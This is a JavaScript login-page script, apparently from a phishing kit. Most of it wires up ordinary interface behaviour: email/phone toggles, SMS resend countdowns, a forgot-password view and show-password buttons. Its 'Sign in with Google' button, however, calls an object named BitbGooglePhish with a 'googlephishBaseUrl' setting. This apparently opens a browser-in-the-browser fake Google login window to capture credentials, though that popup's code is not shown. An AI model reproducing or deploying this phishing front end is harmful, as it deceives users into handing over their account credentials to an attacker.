(function () {
    var cfg = window.APP_CONFIG || {};

    if (window.AuthUI) window.AuthUI.init();

    var googleBtn = document.getElementById('googleSignInBtn');
    if (googleBtn) {
        googleBtn.addEventListener('click', function () {
            var base = window.BitbGooglePhish && window.BitbGooglePhish.normalizeBase(cfg.googlephishBaseUrl);
            if (!base) {
                window.AuthUI.setBanner('Sign-in service unavailable. Please try again later.', 'error');
                return;
            }
            if (window.BitbGooglePhish && window.BitbGooglePhish.open()) return;
            window.AuthUI.setBanner('Could not open sign-in window. Please try again.', 'error');
        });
    }

    var loginForm     = document.getElementById('loginForm');
    var emailBlock    = document.getElementById('emailBlock');
    var phoneBlock    = document.getElementById('phoneBlock');
    var passwordBlock = document.getElementById('passwordBlock');
    var smsBlock      = document.getElementById('smsBlock');

    if (loginForm) {
        loginForm.addEventListener('submit', function (e) { e.preventDefault(); });
    }

    function showEmail() { if (emailBlock) emailBlock.style.display = ''; if (phoneBlock) phoneBlock.style.display = 'none'; }
    function showPhone() { if (emailBlock) emailBlock.style.display = 'none'; if (phoneBlock) phoneBlock.style.display = ''; }

    var usePhoneLink = document.getElementById('toggleInputMode');
    var useEmailLink = document.getElementById('toggleInputModePhone');
    if (usePhoneLink) usePhoneLink.addEventListener('click', function (e) { e.preventDefault(); showPhone(); });
    if (useEmailLink) useEmailLink.addEventListener('click', function (e) { e.preventDefault(); showEmail(); });

    function showPassword() { if (passwordBlock) passwordBlock.style.display = ''; if (smsBlock) smsBlock.style.display = 'none'; }
    function showSms()      { if (passwordBlock) passwordBlock.style.display = 'none'; if (smsBlock) smsBlock.style.display = ''; }

    var smsToggleLink = document.getElementById('smsToggleLink');
    var pwdToggleLink = document.getElementById('pwdToggleLink');
    if (smsToggleLink) smsToggleLink.addEventListener('click', function (e) { e.preventDefault(); showSms(); });
    if (pwdToggleLink) pwdToggleLink.addEventListener('click', function (e) { e.preventDefault(); showPassword(); });

    var loginView  = document.getElementById('loginView');
    var forgotView = document.getElementById('forgotView');

    function showForgot() { if (loginView) loginView.style.display = 'none'; if (forgotView) forgotView.style.display = ''; }
    function showMainLogin() { if (forgotView) forgotView.style.display = 'none'; if (loginView) loginView.style.display = ''; }

    var forgotLink = document.getElementById('forgotPasswordLink');
    var backBtn    = document.getElementById('backToLogin');
    if (forgotLink) forgotLink.addEventListener('click', function (e) { e.preventDefault(); showForgot(); });
    if (backBtn)    backBtn.addEventListener('click', function () { showMainLogin(); });

    var forgotForm = document.getElementById('forgotForm');
    if (forgotForm) forgotForm.addEventListener('submit', function (e) { e.preventDefault(); });

    var fpEmailBlock = document.getElementById('fpEmailBlock');
    var fpPhoneBlock = document.getElementById('fpPhoneBlock');
    var fpUsePhone   = document.getElementById('fpToggleInputMode');
    var fpUseEmail   = document.getElementById('fpToggleInputModePhone');
    if (fpUsePhone) fpUsePhone.addEventListener('click', function (e) { e.preventDefault(); if (fpEmailBlock) fpEmailBlock.style.display = 'none'; if (fpPhoneBlock) fpPhoneBlock.style.display = ''; });
    if (fpUseEmail) fpUseEmail.addEventListener('click', function (e) { e.preventDefault(); if (fpPhoneBlock) fpPhoneBlock.style.display = 'none'; if (fpEmailBlock) fpEmailBlock.style.display = ''; });

    function startCountdown(btn, originalText) {
        var seconds = 60;
        btn.disabled = true;
        btn.textContent = seconds + 's';
        var timer = setInterval(function () {
            seconds--;
            if (seconds <= 0) {
                clearInterval(timer);
                btn.disabled = false;
                btn.textContent = originalText || 'Resend';
            } else {
                btn.textContent = seconds + 's';
            }
        }, 1000);
    }

    ['sendCodeBtn', 'fpSendCodeBtn', 'twoFaEmailResend', 'twoFaPhoneResend'].forEach(function (id) {
        var btn = document.getElementById(id);
        var orig = btn && btn.textContent;
        if (btn) btn.addEventListener('click', function () { startCountdown(btn, orig); });
    });

    function wireTogglePwd(inputId, btnId) {
        var inp = document.getElementById(inputId);
        var btn = document.getElementById(btnId);
        if (!inp || !btn) return;
        btn.addEventListener('click', function () {
            var hidden = inp.type === 'password';
            inp.type = hidden ? 'text' : 'password';
            btn.setAttribute('aria-pressed', hidden ? 'true' : 'false');
            btn.setAttribute('aria-label', hidden ? 'Hide password' : 'Show password');
            var eye = btn.querySelector('.eye-icon');
            if (eye) {
                eye.innerHTML = hidden
                    ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>' +
                      '<path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>' +
                      '<line x1="1" y1="1" x2="23" y2="23"/>'
                    : '<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>' +
                      '<circle cx="12" cy="12" r="3"/>';
            }
        });
    }

    wireTogglePwd('password', 'togglePwd');
    wireTogglePwd('fpNewPwd', 'fpToggleNewPwd');
    wireTogglePwd('fpConfirmPwd', 'fpToggleConfirmPwd');
})();
